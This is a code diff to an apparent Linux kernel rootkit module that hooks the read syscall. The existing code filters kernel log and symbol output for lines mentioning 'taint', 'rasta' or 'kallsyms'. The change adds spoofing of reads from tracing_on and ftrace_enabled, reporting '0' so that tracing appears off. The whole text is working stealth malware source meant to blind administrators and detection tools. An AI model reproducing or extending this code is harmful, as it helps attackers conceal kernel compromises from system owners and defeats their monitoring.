@@ -15,18 +15,27 @@ static asmlinkage ssize_t hooked_read(const struct pt_regs *regs);
 static notrace asmlinkage ssize_t hooked_read(const struct pt_regs *regs) {
     int fd = regs->di; // First argument of read: fd
     char __user *user_buf = (char __user *)regs->si; // Second argument: output buffer for user
-    size_t count = regs->dx; // Number of bytes to read
     char *kernel_buf;
     ssize_t bytes_read;
     struct file *file;
 
+    static int spoof_next_read = 0; // Used to spoof one read
+
     // Check if the fd is from /dev/kmsg, /proc/kallsyms or /sys/kernel/tracing/touched_functions
     file = fget(fd); // Gets the file object corresponding to the fd
     if (file) {
-        // Check if the file is /dev/kmsg or /proc/kallsyms or /sys/kernel/tracing/touched_functions
+        // Check if the file is:
+	// 	- /dev/kmsg 
+	// 	- /proc/kallsyms or
+	// 	- /sys/kernel/tracing/touched_functions
+	// 	- /sys/kernel/tracing/tracing_on
+	// 	- /proc/sys/kernel/ftrace_enabled
+	
         if (strcmp(file->f_path.dentry->d_name.name, "kmsg") == 0 ||
             strcmp(file->f_path.dentry->d_name.name, "kallsyms") == 0 ||
-            strcmp(file->f_path.dentry->d_name.name, "touched_functions") == 0) {
+            strcmp(file->f_path.dentry->d_name.name, "touched_functions") == 0 ||
+	    strcmp(file->f_path.dentry->d_name.name, "ftrace_enabled") == 0 ||
+	    strcmp(file->f_path.dentry->d_name.name, "tracing_on") == 0) {
             
             fput(file); // Frees the file object after verification
 
@@ -48,6 +57,14 @@ static notrace asmlinkage ssize_t hooked_read(const struct pt_regs *regs) {
             if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
                 kfree(kernel_buf);
                 return -EFAULT;
+            }
+
+	    // If the current val is "1" we need to spoof it, change it to "0" once. If not the zeros are so bad bro ...
+            if (spoof_next_read == 0 && strncmp(kernel_buf, "1", 1) == 0) {
+                kernel_buf[0] = '0';
+                spoof_next_read = 1; // Ensure spoof happens only once
+            } else {
+                spoof_next_read = 0; // Reset spoof
             }
 
             // Filter out lines that contain the words "taint", "rasta", or "kallsyms"
